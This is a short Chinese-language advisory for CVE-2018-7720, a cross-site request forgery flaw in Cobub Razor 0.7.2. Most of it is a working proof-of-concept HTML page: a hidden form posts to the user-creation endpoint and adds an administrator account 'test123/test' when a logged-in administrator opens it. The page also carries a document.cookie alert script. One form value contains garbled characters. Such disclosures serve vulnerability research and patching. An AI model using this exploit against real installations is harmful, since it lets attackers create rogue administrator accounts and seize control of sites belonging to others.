---
title: "（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞"
id: zhfly2847
---

# （CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞

## 一、漏洞简介

Cobub Razor 0.7.2存在跨站请求伪造漏洞，管理员登陆后访问特定页面可增加管理员账号。保存如下利用代码为html页面，打开页面将增加test123/test的管理员账号。

## 二、漏洞影响

Cobub Razor 0.7.2

## 三、复现过程

### POC

```
<body>
  <script>alert(document.cookie)</script>
    <form action="http://0-sec.org/index.php?/user/createNewUser/" method="POST">
      <input type="hidden" name="username" value="test123" />
      <input type="hidden" name="email" value="test&#64;test123&#46;test" />
      <input type="hidden" name="password" value="test" />
      <input type="hidden" name="confirm&#95;password" value="test" />
      <input type="hidden" name="userrole" value="3" />
      <input type="hidden" name="user&#47;ccreateNewUser" value="�&#136;&#155;�&#187;�" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html> 
```